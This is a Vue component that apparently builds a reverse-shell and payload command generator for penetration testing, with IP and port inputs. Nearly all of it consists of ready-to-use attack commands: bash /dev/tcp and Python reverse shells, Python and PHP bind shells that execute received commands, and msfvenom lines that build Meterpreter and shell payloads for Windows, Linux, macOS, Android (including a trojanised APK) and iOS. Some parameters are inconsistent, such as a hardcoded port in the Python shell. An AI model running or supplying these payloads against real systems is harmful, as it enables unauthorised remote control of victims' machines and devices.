<template>
    <div style="display: flex;">
        <el-card class="box-card">
            <h4 style="margin-top: 0;">IP & PORT</h4>
            <el-space :size="30">
                <el-input v-model="reverse.ip" style="width: 210px;">
                    <template #prepend>IP:</template>
                </el-input>
                <el-input v-model="reverse.port" style="width: 200px;">
                    <template #prepend>PORT:</template>
                </el-input>
            </el-space>
        </el-card>
        <h1 style="text-align: center; width: 50%; margin-left: 10%;">nc -lvnp 8080</h1>
    </div>
    <el-tabs type="border-card" style="margin-top: 10px;">
        <el-tab-pane label="Reverse">
            <div style="display: flex;">
                <el-table :data="data.rever" border highlight-current-row :show-header="false"
                    @current-change="handleChange" style="width: 30%">
                    <el-table-column prop="label" @current-change="handleChange" />
                </el-table>
                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
                    style="width: 80%; margin-left: 10px;"></el-input>
            </div>
        </el-tab-pane>
        <el-tab-pane label="Bind">
            <div style="display: flex;">
                <el-table :data="data.bind" border highlight-current-row :show-header="false" @current-change="handleChange"
                    style="width: 30%">
                    <el-table-column prop="label" @current-change="handleChange" />
                </el-table>
                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
                    style="width: 80%; margin-left: 10px;"></el-input>
            </div>
        </el-tab-pane>
        <el-tab-pane label="MSFVenom">
            <div style="display: flex;">
                <el-table :data="data.msf" border highlight-current-row :show-header="false" @current-change="handleChange"
                    style="width: 35%; height: 65vh;">
                    <el-table-column prop="label" @current-change="handleChange" />
                </el-table>
                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
                    style="width: 80%; margin-left: 10px;"></el-input>
            </div>
        </el-tab-pane>
    </el-tabs>
</template>
  
<script lang="ts" setup>
import { reactive, watch } from 'vue';

const reverse = reactive({
    ip: '10.10.10.1',
    port: '60001',
    show: '',
})

watch(() => [reverse.ip, reverse.port], ([newIp, newPort], [oldIp, oldPort]) => {
    reverse.show = reverse.show.replaceAll(oldIp, newIp)
    reverse.show = reverse.show.replaceAll(oldPort, newPort)
})

var data = reactive({
    rever: [
        {
            label: "Bash -i",
            value: `sh -i >& /dev/tcp/${reverse.ip}/${reverse.port} 0>&1`,
        },
        {
            label: "Bash 196",
            value: `0<&196;exec 196<>/dev/tcp/${reverse.ip}/${reverse.port}; sh <&196 >&196 2>&196`,
        },
        {
            label: "Bash read line",
            value: `exec 5<>/dev/tcp/${reverse.ip}/${reverse.port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
        },
        {
            label: "Bash 5",
            value: `sh -i 5<> /dev/tcp/${reverse.ip}/${reverse.port} 0<&5 1>&5 2>&5`,
        },
        {
            label: "Python3",
            value: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${reverse.ip}",9012));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
        },
    ],
    bind: [
        {
            label: "Python3 Bind",
            value: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("${reverse.ip}",${reverse.port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
        },
        {
            label: "PHP Bind",
            value: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"${reverse.ip}",${reverse.port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`
        }
    ],
    msf: [
        {
            label: "Windows Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Meterpreter Stageless Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Staged Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Stageless Reverse TCP (x64)",
            value: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f exe -o reverse.exe`
        },
        {
            label: "Windows Staged JSP Reverse TCP",
            value: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f jsp -o ./rev.jsp`
        },
        {
            label: "PHP Meterpreter Stageless Reverse TCP",
            value: `msfvenom -p php/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f raw -o shell.php`
        },
        {
            label: "PHP Reverse PHP",
            value: `msfvenom -p php/reverse_php LHOST=${reverse.ip} LPORT=${reverse.port} -o shell.php`
        },
        {
            label: "JSP Stageless Reverse TCP",
            value: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f raw -o shell.jsp`
        },
        {
            label: "WAR Stageless Reverse TCP",
            value: `msfvenom -p java/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f war -o shell.war`
        },
        {
            label: "Python Stageless Reverse TCP",
            value: `msfvenom -p cmd/unix/reverse_python LHOST=${reverse.ip} LPORT=${reverse.port} -f raw`
        },
        {
            label: "Linux Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f elf -o reverse.elf`
        },
        {
            label: "Linux Stageless Reverse TCP (x64)",
            value: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f elf -o reverse.elf`
        },
        {
            label: "macOS Meterpreter Staged Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "macOS Meterpreter Stageless Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "macOS Stageless Reverse TCP (x64)",
            value: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o shell.macho`
        },
        {
            label: "Android Meterpreter Reverse TCP",
            value: `msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} R -o malicious.apk`
        },
        {
            label: "Android Meterpreter Embed Reverse TCP",
            value: `msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -o payload.apk`
        },
        {
            label: "Apple iOS Meterpreter Reverse TCP Inline",
            value: `msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=${reverse.ip} LPORT=${reverse.port} -f macho -o payload`
        },
    ]
})



function handleChange(row: any) {
    reverse.show = row.value;
}

function updateText() {

}
</script>